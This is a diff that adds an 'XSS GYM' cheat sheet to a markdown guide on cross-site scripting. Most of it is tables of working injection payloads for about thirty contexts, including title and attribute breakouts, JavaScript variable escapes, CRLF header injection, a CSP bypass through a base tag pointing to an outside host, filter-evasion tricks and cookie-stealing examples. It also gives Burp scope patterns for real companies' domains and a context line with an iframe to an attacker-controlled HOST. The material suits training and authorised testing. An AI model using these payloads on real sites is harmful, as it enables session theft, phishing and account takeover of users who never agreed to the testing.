@@ -189,3 +189,163 @@ Again, with the aim to takeover the user machine, an attacker can redirect the b
     <iframe src=//HOST/ style=display:none></iframe>
 ```
 Where  is a domain or IP address controlled by attacker.
+
+
+
+-----------------------------------------------------------
+
+
+
+# XSS GYM
+
+## XSS (Cross-Site Scripting) – Hunting & Payloads Cheat Sheet
+
+**Types of XSS**
+
+1. **Reflected XSS** (Server-Side)
+2. **Stored XSS** (Blind XSS) (Server-Side)
+3. **DOM XSS** (Client-Side)
+
+**Payload collections**  
+- [XSS Payloadbox](https://github.com/payloadbox/xss-payload-list)  
+- [Payloads All The Things – XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
+
+## 1. Reflected XSS – Hunting Methodology
+
+### Steps to Hunt Reflected XSS
+
+1. **Mapping / Crawling the Application**
+   - Add target into Burp scope
+   - Use advanced scope control if needed (wildcards):
+     ```
+     .*\.facebook\.com$
+     .*\.test\.com$
+     .*\.test\.*$
+     (^|^[^:]+:\/\/|[^\.]+\.)zscaler.*
+     ```
+   - Target → Scope → Use advanced scope control → Add
+   - Site map → Show only in-scope items
+
+2. **Pick the parameters**
+   - Target → Site map → Contents
+   - Sort by parameters (look for ✔️ in GET/POST)
+   - **GET** example:
+     ```
+     /test/demo_form.php?name1=value1&name2=value2
+     ```
+   - **POST** example:
+     ```
+     POST /test/demo_form.php HTTP/1.1
+     Host: target.com
+
+     name1=value1&name2=value2
+     ```
+
+3. **Check Reflection**
+   - Send each interesting parameter to Repeater
+   - Change value → look in response if it reflects (raw + rendered)
+
+4. **Create payload**
+   - Basic HTML injection test:
+     ```html
+     <u>underlined</u>
+     <h1>Big heading</h1>
+     ```
+   - Classic JavaScript payload:
+     ```html
+     <script>alert(1)</script>
+     ```
+   - Common image-based:
+     ```html
+     <img src=x onerror=confirm(1)>
+     <svg onload=confirm(1)>
+     </title><img src=3dx onerror=confirm(1)>
+     ```
+
+### Impact Examples
+
+- **Cookie Stealing**
+  ```html
+  <script>alert(document.cookie)</script>
+  ```
+  → `login=test%2Ftest` → decode → `test/test` → use in Cookie Editor
+
+- **Phishing**  
+  Inject fake login form that mimics the real one
+
+## 2. Stored / Blind XSS
+
+Typical locations:  
+- Contact Us forms (email, fname, lname, message)  
+- Comments, profiles, support tickets, etc.
+
+**Recommended blind XSS platform**  
+→ [xsshunter.com](https://xsshunter.com)  
+Paste payload → wait for admin/viewer to trigger → check Fires tab
+
+### XSS Gym / Training Exercises – Summary Table
+
+| #   | Exercise Title                                      | Injection Context                          | Example Working Payload(s)                                                                                     |
+|-----|------------------------------------------------------|--------------------------------------------|----------------------------------------------------------------------------------------------------------------|
+| 01  | Injection in Title Tag                               | Inside `<title>`                           | `</title><script>alert(1)</script><u>asdf`                                                                     |
+| 02  | —                                                    | After `</noscript>`                        | `</noscript><script>alert(1)</script>asdf`                                                                     |
+| 03  | —                                                    | After `</style>`                           | `</style><script>alert(1)</script>asdf`                                                                        |
+| 04  | Filtered Injection Inside Event Handler              | `onload="doSomething('…')"`                | `asdf%26%23x27%3b-alert(1)-%26%23x27%3b`                                                                       |
+| 05  | —                                                    | After `</h1>`                              | `</h1><script>alert(1)</script>asdf`                                                                           |
+| 06  | Injection in Attribute Value – Double Quote          | `value="…"`                                | `"><script>alert(1)</script>`                                                                                  |
+| 07  | — (single quote)                                     | `value='…'`                                | `'><script>alert(1)</script>`                                                                                  |
+| 08  | Filtered Injection in Attribute Value – Double Quote | Can't break out with `"`                   | `"+onmouseover="alert(1)`<br>`"+autofocus+onfocus="alert(1)`<br>`+onmouseover='alert(1)//`                     |
+| 09  | — (single quote variants)                            | `value='…'`                                | `'+onmouseover='alert(1)`<br>`'+autofocus+onfocus='alert(1)//`                                                 |
+| 10  | Injection in Textarea Tag                            | Inside `<textarea>`                        | `</textarea><script>alert(1)</script>`                                                                         |
+| 11  | Injection in Script Tag – Single Quote Delimiter     | Inside `<script>`                          | `</script><img src=x onerror=confirm(1)>`<br>`</script><img src=x onerror=confirm`1`>` (backticks)             |
+| 12  | — (cookie exfil)                                     | —                                          | `</script><img src=x onerror=confirm(document.cookie)>`                                                        |
+| 13  | Injection in JavaScript Variable – Single Quote      | `var p = 'asdf';`                          | `';alert(1);//`<br>`'-alert(1)-'`<br>`'-alert(1)//`                                                            |
+| 14  | — (double quote)                                     | `var p = "asdf";`                          | `"-alert(1)-"`                                                                                                 |
+| 15  | Filtered – Single Quote                              | `var p = 'asdf';`                          | `\'-alert(1)-//`                                                                                               |
+| 16  | — (double quote)                                     | —                                          | `\"alert(1)//`                                                                                                 |
+| 17  | — (svg)                                              | —                                          | `</script><svg onload=prompt(1)>`                                                                              |
+| 18  | — (backticks)                                        | `var p = `asdf`;`                          | `` `-alert(1)-` ``                                                                                             |
+| 19  | — (escaped backtick)                                 | —                                          | `\`;alert(1)//`                                                                                                |
+| 20  | Filtered – Backticks Delimiter                       | `var p = `asdf`;`                          | `${alert(1)}`                                                                                                  |
+| 21  | Validated Injection in HTTP Referer                  | Regex validated referrer                   | `javascript://%0aalert(1)?whatever`<br>or double encode: `javascript://%250aalert(1)?whatever`                 |
+| 22  | Injection in Iframe Tag                              | Inside `<iframe>`                          | `"></iframe><img src=x onerror=confirm(1)>`                                                                    |
+| 23  | Injection in HTTP Header (CRLF)                      | Header injection                           | `%0d%0aXSS:+1`<br>`%0d%0aContent-Type:+text/html`<br>`<script>alert(1)</script>%0d%0aContent-Type:+text/html` |
+| 24  | Filtered Double Injection in JS Variable             | `'` gets encoded                           | `-alert(1)//asdf\`                                                                                             |
+| 28  | Injection in HTML Comments                           | `<!-- asdf -->`                            | `--><script>alert(1)</script>`                                                                                 |
+| 29  | Filtered Injection in HTML Comments                  | `<!-- STRING -->`                          | `--><script>alert(1)</script>-->`                                                                              |
+| 30  | Filtered Injection in JS DOM – Document Sink         | `element.innerHTML`                        | Encode payload (octal / URL) → `\74\151\155\147 ...`                                                           |
+| 31  | Injection in Script Tag With Header                  | Custom header before Accept                | `xss</script><script>alert(1)</script>`                                                                        |
+| 32  | Injection in URL (path)                              | Manipulate path                            | `/asdf"><script>alert(1)</script>`                                                                             |
+| 33  | Bypassing CSP                                        | `script-src 'nonce-…'`                     | `</h1><base href="//x55.is">`                                                                                  |
+
+## 3. DOM-based XSS
+
+**Quick indicators**  
+- Value does **not** appear in source code  
+- Appears only after JavaScript execution  
+- Use **DOM Invader** (Burp Suite extension)
+
+### DOM Sink Types – Summary
+
+| #   | Sink Type             | Typical Location / Sink              | Example Payload(s)                              |
+|-----|-----------------------|--------------------------------------|-------------------------------------------------|
+| 25  | Document Sink         | `element.innerHTML`, `document.write` | `<img src=x onerror=alert(1)>`                 |
+| 26  | Location Sink         | `location =`, `location.href =`      | `javascript:alert(1)`                           |
+| 27  | Execution Sink        | `eval()`, `setTimeout()`, `Function()` | `';alert(1)//` or direct in parameter           |
+| 30  | Filtered Document Sink| `innerHTML` again                    | Octal encoded: `\74\151\155\147 ...`            |
+
+## 4. More XSS Bypass & Filtering Tips
+
+| Situation                                      | Technique / Payload Example                                                                 |
+|------------------------------------------------|---------------------------------------------------------------------------------------------|
+| `<script>` filtered                            | `<scr<script>ipt>alert(1)</scr</script>ipt>`                                               |
+| Case-sensitive filter on `script`              | `<ScRIpT>alert(1)</sCrIPT>`                                                                |
+| `alert`, `confirm`, `prompt` blocked           | `print()` / `alert``1`` / confirm`1``                                                      |
+| `()` blacklisted                               | `alert`1``<br>`print`1``                                                                   |
+| String concatenation blocked                   | `eval('ale'+'rt')(1)`                                                                      |
+| `eval` + `atob` allowed                        | `<script>eval(atob("J2FsZXJ0KDEp"))</script>`                                              |
+| Heavy filtering / everything blocked           | Use **JSFuck** encoder → `<script>[encoded jsfuck here]</script>`                          |
+
+Good luck hunting! 🦊
+
+Feel free to open issues / PRs if you want to add more exercises or modern payloads.
